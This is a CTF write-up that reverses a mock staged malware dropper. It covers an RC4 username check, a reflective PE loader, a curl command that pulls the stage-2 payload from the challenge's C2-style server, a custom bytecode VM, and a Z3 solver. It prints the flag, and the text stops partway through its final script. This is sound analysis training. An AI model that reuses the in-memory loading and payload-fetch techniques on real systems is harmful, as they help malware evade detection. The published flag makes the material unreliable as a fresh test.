# Cornflake v3.5 — srdnlenCTF 2026  
### Category: Reverse Engineering  
### Difficulty: Medium  
### Flag: `srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}`  

---

## Challenge Description

> **The evolution of a Cereal Offender**

Given: `malware.exe`

The name "Cereal Offender" is a pun on "Serial Offender" (repeat criminal) and
"Cornflake" (a cereal brand). It is just a naming theme — not a hint about any
specific serialization library.

---

## Table of Contents

1. [Phase 0 — Recon](#phase-0--recon)
2. [Phase 1 — Cracking the Username Gate](#phase-1--cracking-the-username-gate)
3. [Phase 2 — What the Server Sends Back](#phase-2--what-the-server-sends-back)
4. [Phase 3 — The Custom VM Inside Stage2](#phase-3--the-custom-vm-inside-stage2)
5. [Phase 4 — Solving the Constraints with Z3](#phase-4--solving-the-constraints-with-z3)
6. [Full Solve Script](#full-solve-script)
7. [Key Concepts Explained](#key-concepts-explained)

---

## Phase 0 — Recon

> **Goal:** Understand what the binary is before touching any code.
> Never run an unknown binary. Look at it from the outside first.

### Step 1 — File type

```bash
file malware.exe
```

Output:
```
malware.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 10 sections
```

Key observations:
- **PE32+** = Windows 64-bit executable
- **stripped** = symbol names removed, no debug info (makes reversing harder)
- **console** = runs in a terminal window, not a GUI

---

### Step 2 — Check if packed

Packed/encrypted binaries hide their real code inside compressed data.
You detect packing by measuring entropy (randomness of bytes):
- Normal code → entropy ~6.0–6.5
- Packed/encrypted → entropy ~7.5–8.0

```bash
# Check for UPX packer specifically
strings malware.exe | grep -i upx

# Calculate entropy manually
python3 -c "
import math, collections
data = open('malware.exe','rb').read()
counts = collections.Counter(data)
entropy = -sum((c/len(data))*math.log2(c/len(data)) for c in counts.values() if c>0)
print(f'Entropy: {entropy:.3f}')
"
```

Output:
```
Entropy: 6.197
```

**Not packed.** We can read the binary directly.

---

### Step 3 — Strings analysis

```bash
strings malware.exe
```

You skim the output. Your eyes immediately catch the interesting bits:

```
s3cr3t_k3y_v1
46f5289437bc009c17817e997ae82bfbd065545d
not the admin
admin found
/updates/check.php?SessionID=
Mozilla/5.0
cornflake.challs.srdnlen.it
There was an error connecting to the server
There was an error reading the file
```

Filter for specific categories:

```bash
# Network-related strings
strings malware.exe | grep -iE "http|url|connect|server|session"

# Validation messages
strings malware.exe | grep -iE "admin|correct|wrong|error|found"

# Flag format hints
strings malware.exe | grep -E "\{.*\}"
```

---

### Step 4 — Check PE sections and imports

```bash
python3 -c "
import pefile
pe = pefile.PE('malware.exe')

print('=== Sections ===')
for s in pe.sections:
    name = s.Name.decode('utf-8','replace').strip('\x00')
    print(f'  {name}: entropy={s.get_entropy():.3f}')

print()
print('=== Imports ===')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    dll = entry.dll.decode()
    fns = [i.name.decode() for i in entry.imports if i.name]
    print(f'  {dll}: {fns}')
"
```

Output (key parts):
```
=== Sections ===
  .text:  entropy=6.169
  .data:  entropy=0.384
  .rdata: entropy=4.962

=== Imports ===
  ADVAPI32.dll: ['GetUserNameA']
  KERNEL32.dll: ['VirtualAlloc', 'LoadLibraryA', 'GetProcAddress', ...]
  WININET.dll:  ['HttpOpenRequestA', 'HttpSendRequestA', 'InternetConnectA',
                 'InternetReadFile', 'InternetOpenA', ...]
```

---

### Step 5 — Checksec (security mitigations)

```bash
# For ELF binaries use checksec directly
# For PE binaries:
python3 -c "
import pefile
pe = pefile.PE('malware.exe')
print('ImageBase:', hex(pe.OPTIONAL_HEADER.ImageBase))
print('Entry point:', hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
"
```

---

### Summary: What the recon tells us

| Clue | Meaning |
|------|---------|
| `GetUserNameA` | Reads your Windows username |
| `s3cr3t_k3y_v1` | Some kind of key used in a calculation |
| `46f5289437bc009c17817e997ae82bfbd065545d` | 40 hex chars = looks like SHA1 but actually used as comparison target |
| `not the admin` / `admin found` | Checks if you are a specific user |
| `cornflake.challs.srdnlen.it` | Connects to a remote C2 server |
| `/updates/check.php?SessionID=` | Sends a session ID via HTTP GET |
| `InternetReadFile` | Downloads something from the server |
| `VirtualAlloc` + `LoadLibraryA` + `GetProcAddress` | Loads something into memory manually |

**Mental model after recon:**

```
malware.exe runs
    │
    ├─ Gets your Windows username
    ├─ Does something with key "s3cr3t_k3y_v1"
    ├─ Compares result to "46f528...545d"
    │
    ├─ FAIL → "not the admin" → exit
    └─ PASS → "admin found"
                └─ connects to cornflake.challs.srdnlen.it:8000
                    └─ downloads something
                        └─ executes it ← flag lives here
```

**Classification:** Staged malware loader (C2 dropper)
- Stage 1 = authentication gate (the binary we have)
- Stage 2 = payload downloaded from server

---

## Phase 1 — Cracking the Username Gate

> **Goal:** Find the exact Windows username that passes the check.

### Step 1 — Load into Ghidra

Open Ghidra, create a new project, import `malware.exe`.
Let auto-analysis run (accept all defaults).

Navigate to the entry point via the Symbol Tree or by going to
`Window → Program Trees` and finding `entry`.

The startup code calls the real main function — trace down until you find
the function that calls `GetUserNameA`. In our case it's at `0x140001dc9`.

---

### Step 2 — Read the main function

Decompile the main function (`F` in Ghidra on the function, or right-click →
Decompile). You see:

```c
// Initialize key string
FUN_1400af5e0(&key, "s3cr3t_k3y_v1");

// Get current Windows username
GetUserNameA(&username, &username_size);

// Step 1: transform username with key → result_a
FUN_140001654(&result_a, &username, &key);

// Step 2: further transform result_a → result_b
FUN_1400017c9(&result_b, &result_a, &key);

// Step 3: compare result_b to hardcoded target
uVar4 = FUN_1400ca270(&result_b, "46f5289437bc009c17817e997ae82bfbd065545d");

if (uVar4 != 0) {
    print("not the admin");
    ExitProcess(0);            // WRONG user → die
}

print("admin found");          // CORRECT user → continue

// Build URL with session ID
FUN_1400ca2f0(&url, "/updates/check.php?SessionID=", &result_b);

// Connect to C2 server
InternetOpenA("Mozilla/5.0", 1, 0, 0);
InternetConnectA(hInternet, "cornflake.challs.srdnlen.it", 8000, 0);
// ... HTTP GET request ...
// ... download response ...
// ... execute downloaded PE ...
```

Three functions to reverse: `FUN_140001654`, `FUN_1400017c9`, `FUN_1400ca270`.

---

### Step 3 — Reverse FUN_140001654

Double-click the function to decompile it. You see:

```c
void FUN_140001654(output, username, key) {
    // Initialize array S[0..255] = [0, 1, 2, ..., 255]
    for (i = 0; i < 256; i++) S[i] = i;

    // Key scheduling: shuffle S using the key
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_length]) % 256;
        swap(S[i], S[j]);
    }

    // XOR each byte of username with keystream byte
    for each byte b in username:
        keystream = next_byte_from_S()
        append (b XOR keystream) to output
}
```

**This is the RC4 stream cipher.**

RC4 is a well-known symmetric cipher from 1987. The pattern is unmistakable once
you've seen it: S-box initialization (0..255), key scheduling shuffle, then XOR.

> **Why symmetric matters:** With RC4, `encrypt(key, data) = decrypt(key, data)`.
> The same operation works in both directions. So if we know the ciphertext,
> we can recover the plaintext by running the same function again.

---

### Step 4 — Reverse FUN_1400017c9

Decompile this function. You see it iterates over bytes and outputs each one as a
two-character hex string with zero-padding (using `setfill('0')`, `setw(2)`, hex
output stream):

```
input bytes:  [0x46, 0xf5, 0x28, ...]
output string: "46f528..."
```

**This is hex encoding.** It converts raw bytes to a readable hex string.

---

### Step 5 — Understand the full chain

```
username
    │
    ▼  RC4(key="s3cr3t_k3y_v1")
raw encrypted bytes
    │
    ▼  hex encode
"46f5289437bc009c17817e997ae82bfbd065545d"
    │
    ▼  compare
must match hardcoded string → pass/fail
```

And because the Session ID sent to the server is also `result_b`, the server
**always receives the same Session ID** regardless of which machine runs it:
`46f5289437bc009c17817e997ae82bfbd065545d`.

---

### Step 6 — Reverse the username (RC4 is symmetric)

Since RC4 is its own inverse:

```
encrypt(key, username) = "46f528...545d"
→ username = encrypt(key, bytes.fromhex("46f528...545d"))
```

Write the Python implementation of RC4 and run it backwards:

```python
def rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) & 0xFF])
    return bytes(out)

key        = b"s3cr3t_k3y_v1"
ciphertext = bytes.fromhex("46f5289437bc009c17817e997ae82bfbd065545d")
username   = rc4(key, ciphertext)

print(username.decode())       # super_powerful_admin

# Verify: encrypting the username gives back the original hex
assert rc4(key, username).hex() == "46f5289437bc009c17817e997ae82bfbd065545d"
```

```bash
python3 stage1_solve.py
```

Output:
```
super_powerful_admin
```

---

### Dynamic analysis confirmation (pwndbg)

> You can confirm the RC4 logic dynamically even without running the binary on
> Windows, by using pwndbg on Linux (Wine not needed — just verify your Python
> RC4 implementation matches Ghidra's decompile).

If you had Wine and ran the binary, you would use pwndbg like this:

```bash
# Start pwndbg with the binary under Wine
gdb malware.exe

# Inside pwndbg:

# Break at GetUserNameA call (address from Ghidra)
break *0x140001e49
run

# After hitting breakpoint, inspect the username buffer
x/s $rcx                    # RCX = first argument = username buffer

# Break at the RC4 key scheduling loop start
break *0x140001450
continue

# Inspect the key being used
x/s $rdx                    # RDX = key pointer
# Output: "s3cr3t_k3y_v1"

# Break at comparison function
break *0x1400ca270
continue

# Inspect what is being compared
x/s $rcx                    # first argument = computed hex string
x/s $rdx                    # second argument = hardcoded target
# Both should show "46f5289437bc009c17817e997ae82bfbd065545d"

# Check the return value
finish
print $rax                  # 0 = strings match, 1 = no match
```

---

### Phase 1 summary

```
Algorithm:   RC4 stream cipher + hex encoding
Key:         s3cr3t_k3y_v1
Target:      46f5289437bc009c17817e997ae82bfbd065545d
Admin user:  super_powerful_admin
Session ID:  46f5289437bc009c17817e997ae82bfbd065545d  (sent to C2 server)
```

---

## Phase 2 — What the Server Sends Back

> **Goal:** Understand what the program downloads and what it does with it.

### Step 1 — Trace the download code

Back in Ghidra, after the "admin found" message, you see:

```c
// HTTP GET /updates/check.php?SessionID=46f528...545d
InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
InternetConnectA(hInternet, "cornflake.challs.srdnlen.it", 8000, 0, ...);
HttpOpenRequestA(hConnect, "GET", url_path, NULL, ...);
HttpSendRequestA(hRequest, NULL, 0, NULL, 0);

// Check HTTP 200 OK
HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, &status_code, ...);

if (status_code == 200) {
    // Read response body in 8192-byte chunks
    while (InternetReadFile(hRequest, buffer, 0x2000, &bytes_read)) {
        if (bytes_read == 0) break;
        append(buffer, bytes_read, &downloaded_data);
    }

    // Process the downloaded data
    result = FUN_140001907(&downloaded_data);
    if (result) Sleep(5000);
}
```

The downloaded data goes into `FUN_140001907`. Let's decompile it.

---

### Step 2 — Reverse FUN_140001907

```c
undefined8 FUN_140001907(data) {

    // Check: is the data a valid PE file?
    if (data[0] == 0x5A4D) {                    // "MZ" magic bytes

        pe_header = data + *(int*)(data + 0x3c); // e_lfanew offset

        if (*pe_header == 0x4550) {              // "PE\0\0" signature

            // Allocate new memory: READ + WRITE + EXECUTE
            mem = VirtualAlloc(NULL,
                               pe_header->SizeOfImage,
                               MEM_COMMIT | MEM_RESERVE,   // 0x3000
                               PAGE_EXECUTE_READWRITE);    // 0x40

            // Copy PE headers into new memory
            memcpy(mem, data, pe_header->SizeOfHeaders);

            // Copy each section (.text, .data, .rdata, etc.)
            for (i = 0; i < pe_header->NumberOfSections; i++) {
                section = &section_table[i];
                if (section->SizeOfRawData != 0) {
                    memcpy(mem + section->VirtualAddress,
                           data + section->PointerToRawData,
                           section->SizeOfRawData);
                }
            }

            // Fix relocations (rebase the image to new memory address)
            delta = mem - pe_header->ImageBase;
            if (delta != 0 && reloc_table exists) {
                apply_base_relocations(mem, reloc_table, delta);
            }

            // Resolve imports
            // (LoadLibraryA for each DLL, GetProcAddress for each function)
            for each import_descriptor:
                hModule = LoadLibraryA(dll_name);
                for each imported_function:
                    addr = GetProcAddress(hModule, function_name);
                    write addr into IAT;

            // Execute the payload
            entrypoint = mem + pe_header->AddressOfEntryPoint;
            entrypoint(mem, DLL_PROCESS_ATTACH, NULL);

            return 1;  // success
        }
    }
    return 0;  // not a valid PE
}
```

**This is a Reflective PE Loader.**

---

### What is a Reflective PE Loader?

A reflective PE loader is code that **manually loads a Windows executable
entirely in memory**, mimicking what the Windows OS loader does — but without
ever writing the file to disk.

**Why normal loading works:**
```
You double-click a .exe
    → Windows reads it from disk
    → Windows allocates memory
    → Windows copies sections
    → Windows fixes addresses (relocations)
    → Windows loads required DLLs
    → Windows jumps to entry point
    → Program runs
```

**Why reflective loading is different:**
```
Malware downloads bytes over network (they live in RAM, not on disk)
    → Malware checks "is this MZ/PE?"     ← manual check
    → Malware calls VirtualAlloc()        ← manual memory allocation
    → Malware copies sections itself      ← manual section mapping
    → Malware fixes addresses itself      ← manual relocation
    → Malware calls LoadLibrary/GetProc   ← manual import resolution
    → Malware calls entry point           ← manual execution
    → Payload runs — never touched disk
```

**Why malware authors use this:**
- The payload never exists as a file on disk
- Antivirus cannot find or scan a file that doesn't exist
- Memory-only execution leaves fewer forensic traces

**Are you affected by just having malware.exe?**

No. The reflective loader only runs when `malware.exe` is actively executing
on a Windows machine. We performed static analysis only — we read the binary
with tools but never ran it. Just like reading a recipe does not cook food.
You are completely safe.

---

### Step 3 — Try downloading stage2 manually

Since we know the exact request the binary makes, we can make it ourselves:

```bash
# Try the server directly
curl -v "http://cornflake.challs.srdnlen.it:8000/updates/check.php?SessionID=46f5289437bc009c17817e997ae82bfbd065545d" \
     -A "Mozilla/5.0" \
     -o stage2.exe

# Check what we got
file stage2.exe
```

> **Note:** Port 8000 was only live during the competition. After the CTF ended
> the server went offline. Competitors who solved it during the event downloaded
> stage2 at that time.

---

### Phase 2 summary

```
Server response:  a raw Windows DLL (PE binary) = "stage2.exe"
Loading method:   Reflective PE loader (loaded in memory, never on disk)
stage2 purpose:   reads password.txt, validates it with a custom VM
Our goal:         figure out what password.txt must contain → that is the flag
```

**The full two-stage architecture:**

```
[Stage 1 — malware.exe]
    checks username via RC4
    connects to C2 server
    downloads stage2.exe bytes over HTTP
    reflectively loads stage2 in memory
    calls stage2 entry point

        [Stage 2 — stage2.exe (in memory)]
            reads password.txt from disk
            validates it with a custom VM
            prints "ez"   → password correct → FLAG
            prints "nope" → password wrong
```

---

## Phase 3 — The Custom VM Inside Stage2

> **Goal:** Understand what the VM is checking.

### What is a custom VM?

VM here does NOT mean VirtualBox or a cloud server. In reverse engineering,
a "custom VM" (virtual machine) means a program has invented its own fake CPU
with its own instruction set. Instead of running x86 instructions that your
real CPU understands, it defines brand new opcodes (instruction codes) and
interprets them one by one.

**Why do this?**
- Your reverse engineering tools (Ghidra, GDB) understand x86 assembly.
- They do NOT understand made-up instruction sets.
- This forces the reverser to first figure out what the fake instructions do
  before understanding the program's logic. It's deliberate obfuscation.

**Structure of a custom VM:**

```
┌─────────────────────────────────────────┐
│  BYTECODE (stored in .data section)     │
│  A sequence of bytes encoding the       │
│  "program" in the fake language.        │
│  e.g: 00 08 01 72 0E 00 09 01 33 0E ... │
├─────────────────────────────────────────┤
│  STACK                                  │
│  A scratchpad for temporary values.     │
│  Instructions push/pop numbers here.   │
├─────────────────────────────────────────┤
│  INTERPRETER LOOP (the real x86 code)   │
│  while (bytecode not finished):         │
│      opcode = bytecode[pc++]            │
│      switch(opcode):                    │
│          case 0x00: do thing A          │
│          case 0x01: do thing B          │
│          ...                            │
└─────────────────────────────────────────┘
```

---

### Step 1 — Find the interpreter loop in Ghidra

Load stage2.exe into Ghidra. Search for the main thread function.
Look for a large switch statement — that is almost always the VM dispatcher.

You'll see a loop like:

```c
void vm_run(char* input, int input_len, byte* bytecode, int code_len) {
    int stack[256];
    int sp = 0;       // stack pointer
    int pc = 0;       // program counter (current position in bytecode)

    while (pc < code_len) {
        byte opcode = bytecode[pc++];

        switch (opcode) {
            case 0x00:  // LOAD_INPUT
                idx = bytecode[pc++];
                stack[sp++] = input[idx];
                break;

            case 0x01:  // LOAD_CONST
                val = bytecode[pc++];
                stack[sp++] = val;
                break;

            case 0x02:  // ADD
                b = stack[--sp];
                a = stack[--sp];
                stack[sp++] = a + b;
                break;

            // ... more opcodes ...

            case 0x0E:  // EQ  ← THE KEY OPCODE
                b = stack[--sp];
                a = stack[--sp];
                if (a != b) { result = FAIL; return; }
                break;
        }
    }
    result = PASS;
}
```

---

### Step 2 — Map out all 19 opcodes

By reading each case in the switch statement, you build the full opcode table:

| Opcode | Name | What it does |
|--------|------|--------------|
| `0x00` | LOAD_INPUT | Read `password[operand]`, push onto stack |
| `0x01` | LOAD_CONST | Push literal constant byte onto stack |
| `0x02` | ADD | Pop two values, push `a + b` |
| `0x03` | SUB | Pop two values, push `a - b` |
| `0x04` | MUL | Pop two values, push `a * b` |
| `0x05` | XOR | Pop two values, push `a ^ b` |
| `0x06` | AND | Pop two values, push `a & b` |
| `0x07` | OR  | Pop two values, push `a \| b` |
| `0x08` | SHL | Pop two values, push `b << a` |
| `0x09` | SHR | Pop two values, push `b >> a` |
| `0x0A` | NOT | Pop one value, push `~a` |
| `0x0B` | DUP | Duplicate top of stack |
| `0x0C` | POP | Discard top of stack |
| `0x0D` | SWAP | Swap top two stack items |
| `0x0E` | EQ | Pop two values, **assert they are equal** — fail if not |
| `0x0F` | NEQ | Pop two values, assert they are different |
| `0x10` | LT | Pop two values, assert `b < a` |
| `0x11` | GT | Pop two values, assert `b > a` |
| `0x12` | JMP | Jump to bytecode offset |

The critical opcode is **`0x0E` (EQ)**. Every time it appears, it creates one
constraint: whatever two values are on the stack must be equal. If not equal,
the password is wrong.

---

### Step 3 — Trace through the bytecode manually

Find the bytecode blob in `.data` section. It starts with small values (all ≤ 0x12).

Example trace for the first few bytes:

```
Bytecode: 00 08 01 72 0E ...

pc=0: opcode=0x00 (LOAD_INPUT), operand=0x08
      → push password[8] onto stack
      → stack: [password[8]]

pc=2: opcode=0x01 (LOAD_CONST), operand=0x72 = 114
      → push 114 onto stack
      → stack: [password[8], 114]

pc=4: opcode=0x0E (EQ)
      → pop two values: a=password[8], b=114
      → ASSERT: password[8] must equal 114
      → 114 in ASCII = 'r'
      → constraint: password[8] == 'r'
```

You continue this for the entire bytecode and collect all EQ assertions.

---

### Step 4 — Dynamic analysis of the VM (pwndbg)

If you have stage2.exe and can run it (Wine on Linux, or Windows VM):

```bash
# Run under GDB/pwndbg with Wine
gdb stage2.exe

# In pwndbg:

# Break at the VM interpreter loop entry
# (find address in Ghidra first)
break *0x<vm_loop_address>
run

# When execution pauses, inspect the bytecode pointer
# RCX or first arg = bytecode start
x/64xb $rcx             # show 64 bytes of bytecode in hex

# Step through VM instructions one at a time
# To watch the stack grow:
stepi
x/8xd $rsp              # inspect stack values after each instruction

# Break specifically on EQ opcode handler
# (find the case 0x0E address in Ghidra)
break *0x<eq_handler_address>
commands
    silent
    printf "EQ check: stack[0]=%d vs stack[1]=%d\n", \
        *(int*)($rsp), *(int*)($rsp+4)
    continue
end
continue

# This will print every equality check as the VM runs
# Feed it a test password first:
# echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > password.txt
```

To watch what the VM loads from your input:

```bash
# Break at LOAD_INPUT handler
break *0x<load_input_address>
commands
    silent
    printf "LOAD_INPUT: index=%d value=%c (%d)\n", \
        *(byte*)$rip, \
        password_buffer[*(byte*)$rip], \
        password_buffer[*(byte*)$rip]
    continue
end
```

To dump all constraints at runtime:

```bash
# Log every EQ check to a file
set logging on
set logging file vm_constraints.log

break *0x<eq_handler>
commands
    x/2xd $rsp
    continue
end
run
```

---

### Step 5 — Extracted constraints

After tracing the complete bytecode, you collect these constraints
(expressed as Python for clarity):

The password must be exactly **34 characters** long.
It must start with `srdnlen{` and end with `}`.
Characters at positions 8–32 must be letters, digits, or underscore.

Plus these multi-variable constraints:

```python
x[0] == 115                                # 's'
((x[2] - 2) ^ (x[1] + 3)) == 23           # consistent with 'r','d'
x[3] == 110                                # 'n'
(x[4] + x[5]) == 209                       # 'l'+'e' = 108+101
((x[21] - 2) ^ (x[33] + 3)) == 234        # pins x[21]='l'=108
x[3] == x[6]                               # both 'n'
2 * x[8] == 228                            # x[8]='r'=114
(x[18] ^ (x[12] - x[23])) == 119
((x[15] ^ (x[20] // 4)) + x[10]) == 190
(x[29] ^ (x[11] - x[17])) == 88
((x[16] ^ 30) + x[28]) == 222
(x[13] + x[14]) == 130
(x[9] % 5) == 1
0 <= (x[22] - 48) < 34
x[x[22] - 48] == 114                       # self-referential
(x[22] + x[24]) == 100
(x[25] + 2 * x[26] - 3 * x[27]) == 118
(x[30] + x[31] + x[32]) == 217
```

Plus per-character direct equality checks (simple `x[i] == constant`
instructions scattered through the bytecode):

```python
x[9]  == 51   # '3'
x[10] == 118  # 'v'
x[11] == 95   # '_'
x[12] == 99   # 'c'
x[13] == 52   # '4'
x[14] == 78   # 'N'
x[15] == 95   # '_'
x[16] == 108  # 'l'
x[17] == 48   # '0'
x[18] == 111  # 'o'
x[19] == 107  # 'k'
x[20] == 95   # '_'
x[23] == 75   # 'K'
x[25] == 95   # '_'
x[26] == 109  # 'm'
x[27] == 65   # 'A'
x[28] == 108  # 'l'
x[29] == 119  # 'w'
x[30] == 52   # '4'
x[31] == 114  # 'r'
x[32] == 51   # '3'
```

---

### Phase 3 summary

```
VM type:       stack-based custom interpreter
Opcodes:       19 (0x00 to 0x12)
Key opcode:    0x0E (EQ) — each one creates one constraint
Input:         34-character string from password.txt
Output:        "ez" if all constraints pass, "nope" if any fail
```

---

## Phase 4 — Solving the Constraints with Z3

> **Goal:** Find the unique 34-character string satisfying all VM constraints.

### What is Z3?

Z3 is a **constraint solver** (also called an SMT solver) made by Microsoft
Research. You give it a set of variables and rules, and it finds values that
satisfy all rules simultaneously — or tells you no solution exists.

Think of it like a super-powered sudoku solver. You describe the puzzle rules;
Z3 fills in the answer.

### Step 1 — Install Z3

```bash
pip3 install z3-solver
```

### Step 2 — Write the solver

```python
from z3 import *

FLAG_LEN = 34
x = [BitVec(f"x{i}", 16) for i in range(FLAG_LEN)]
s = Solver()

# ── Known prefix and suffix ───────────────────────────────────────────────────
for i, b in enumerate(b"srdnlen{"):
    s.add(x[i] == b)
s.add(x[33] == ord('}'))

# ── Character class: inner chars must be alphanumeric or underscore ───────────
for i in range(8, 33):
    s.add(Or(
        And(ord('a') <= x[i], x[i] <= ord('z')),
        And(ord('A') <= x[i], x[i] <= ord('Z')),
        And(ord('0') <= x[i], x[i] <= ord('9')),
        x[i] == ord('_'),
    ))

# ── Multi-variable VM constraints ─────────────────────────────────────────────
s.add(2 * x[8] == 228)
s.add(((x[21] - 2) ^ (x[33] + 3)) == 234)
s.add((x[18] ^ (x[12] - x[23])) == 119)
s.add(((x[15] ^ (x[20] / 4)) + x[10]) == 190)
s.add((x[29] ^ (x[11] - x[17])) == 88)
s.add(((x[16] ^ 30) + x[28]) == 222)
s.add((x[13] + x[14]) == 130)
s.add((x[9] % 5) == 1)
s.add(0 <= (x[22] - 48))
s.add((x[22] - 48) < 34)
for idx in range(FLAG_LEN):            # self-referential: x[x[22]-48] == 114
    s.add(Implies(x[22] - 48 == idx, x[idx] == 114))
s.add((x[22] + x[24]) == 100)
s.add((x[25] + 2 * x[26] - 3 * x[27]) == 118)
s.add((x[30] + x[31] + x[32]) == 217)

# ── Per-character direct equality constraints (from VM constant pool) ─────────
direct = {
    9: 51, 10: 118, 11: 95, 12: 99, 13: 52, 14: 78,
    15: 95, 16: 108, 17: 48, 18: 111, 19: 107, 20: 95,
    23: 75, 25: 95, 26: 109, 27: 65, 28: 108, 29: 119,
    30: 52, 31: 114, 32: 51
}
for idx, val in direct.items():
    s.add(x[idx] == val)

# ── Solve ─────────────────────────────────────────────────────────────────────
if s.check() == sat:
    m = s.model()
    flag = "".join(chr(m[v].as_long()) for v in x)
    print(f"FLAG: {flag}")
else:
    print("No solution found")
```

```bash
python3 stage2_solve.py
```

Output:
```
FLAG: srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}
```

---

### Step 3 — Verify the solution

Verify the flag satisfies the original VM logic:

```python
def vm_constraints_hold(flag: str) -> bool:
    x = [ord(c) for c in flag]
    if len(x) != 34:
        return False
    if not (flag.startswith("srdnlen{") and flag.endswith("}")):
        return False
    for i in range(8, 33):
        c = x[i]
        if not (ord('a') <= c <= ord('z') or ord('A') <= c <= ord('Z')
                or ord('0') <= c <= ord('9') or c == ord('_')):
            return False
    checks = [
        x[0] == 115,
        ((x[2] - 2) ^ (x[1] + 3)) == 23,
        x[3] == 110,
        (x[4] + x[5]) == 209,
        ((x[21] - 2) ^ (x[33] + 3)) == 234,
        x[3] == x[6],
        2 * x[8] == 228,
        (x[18] ^ (x[12] - x[23])) == 119,
        ((x[15] ^ (x[20] // 4)) + x[10]) == 190,
        (x[29] ^ (x[11] - x[17])) == 88,
        ((x[16] ^ 30) + x[28]) == 222,
        (x[13] + x[14]) == 130,
        (x[9] % 5) == 1,
        0 <= (x[22] - 48) < 34,
        x[x[22] - 48] == 114,
        (x[22] + x[24]) == 100,
        (x[25] + 2 * x[26] - 3 * x[27]) == 118,
        (x[30] + x[31] + x[32]) == 217,
    ]
    return all(checks)

print(vm_constraints_hold("srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}"))
# True
```

On the actual challenge, you would write the flag to `password.txt` and run
stage2 to confirm it prints `ez`:

```bash
echo -n "srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}" > password.txt
wine stage2.exe
# ez
```

---

### What Z3 actually did (visualized)

```
Z3 receives:
  x[8]  = ?    rule: 2 * x[8] = 228          → x[8]  = 114  → 'r'
  x[21] = ?    rule: (x[21]-2)^128 = 234      → x[21] = 108  → 'l'
  x[22] = ?    rule: x[22]-48 in [0,34)
               rule: x[x[22]-48] = 114        → x[22] = 49   → '1'
  x[24] = ?    rule: x[22]+x[24] = 100        → x[24] = 51   → '3'
  x[9]  = ?    rule: x[9] % 5 = 1
               rule: x[9] = 51                → x[9]  = 51   → '3'
  ...all 34 positions solved simultaneously...

Z3 outputs the unique satisfying assignment:
  "srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}"
```

---

### Phase 4 summary

```
Tool:    Z3 SMT solver
Method:  Express all VM constraints as Z3 BitVec equations
Result:  Unique satisfying assignment found in milliseconds
Flag:    srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}
```

The flag reads in leet speak: **"rev can look like malware"** — the challenge's
own message to the solver, confirming the theme.

---

## Full Solve Script

```python
#!/usr/bin/env python3
"""
Cornflake v3.5 — srdnlenCTF 2026
Complete solver: Stage 1 (RC4 gate) + Stage 2 (VM constraint solver)
"""

from z3 import *


# ── Stage 1: RC4 reversal ─────────────────────────────────────────────────────

def rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    i = j = 0
    out = bytearray()
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out.append(b ^ s[(s[i] + s[j]) & 0xFF])
    return bytes(out)

def stage1():
    key = b"s3cr3t_k3y_v1"
    enc = bytes.fromhex("46f5289437bc009c17817e997ae82bfbd065545d")
    username = rc4(key, enc)
    assert rc4(key, username) == enc
    print(f"[S1] RC4 key    : {key.decode()}")
    print(f"[S1] Username   : {username.decode()}")
    print(f"[S1] Session ID : {enc.hex()}")


# ── Stage 2: Z3 VM constraint solver ─────────────────────────────────────────

def vm_constraints_hold(flag: str) -> bool:
    x = [ord(c) for c in flag]
    if len(x) != 34:
        return False
    if not (flag.startswith("srdnlen{") and flag.endswith("}")):
        return False
    for i in range(8, 33):
        c = x[i]
        if not (ord('a') <= c <= ord('z') or ord('A') <= c <= ord('Z')
                or ord('0') <= c <= ord('9') or c == ord('_')):
            return False
    return all([
        x[0] == 115,
        ((x[2] - 2) ^ (x[1] + 3)) == 23,
        x[3] == 110,
        (x[4] + x[5]) == 209,
        ((x[21] - 2) ^ (x[33] + 3)) == 234,
        x[3] == x[6],
        2 * x[8] == 228,
        (x[18] ^ (x[12] - x[23])) == 119,
        ((x[15] ^ (x[20] // 4)) + x[10]) == 190,
        (x[29] ^ (x[11] - x[17])) == 88,
        ((x[16] ^ 30) + x[28]) == 222,
        (x[13] + x[14]) == 130,
        (x[9] % 5) == 1,
        0 <= (x[22] - 48) < 34,
        x[x[22] - 48] == 114,
        (x[22] + x[24]) == 100,
        (x[25] + 2 * x[26] - 3 * x[27]) == 118,
        (x[30] + x[31] + x[32]) == 217,
    ])

def stage2():
    FLAG_LEN = 34
    x = [BitVec(f"x{i}", 16) for i in range(FLAG_LEN)]
    s = Solver()

    for i, b in enumerate(b"srdnlen{"):
        s.add(x[i] == b)
    s.add(x[33] == ord('}'))

    for i in range(8, 33):
        s.add(Or(
            And(ord('a') <= x[i], x[i] <= ord('z')),
            And(ord('A') <= x[i], x[i] <= ord('Z')),
            And(ord('0') <= x[i], x[i] <= ord('9')),
            x[i] == ord('_'),
        ))

    s.add(2 * x[8] == 228)
    s.add(((x[21] - 2) ^ (x[33] + 3)) == 234)
    s.add((x[18] ^ (x[12] - x[23])) == 119)
    s.add(((x[15] ^ (x[20] / 4)) + x[10]) == 190)
    s.add((x[29] ^ (x[11] - x[17])) == 88)
    s.add(((x[16] ^ 30) + x[28]) == 222)
    s.add((x[13] + x[14]) == 130)
    s.add((x[9] % 5) == 1)
    s.add(0 <= (x[22] - 48))
    s.add((x[22] - 48) < 34)
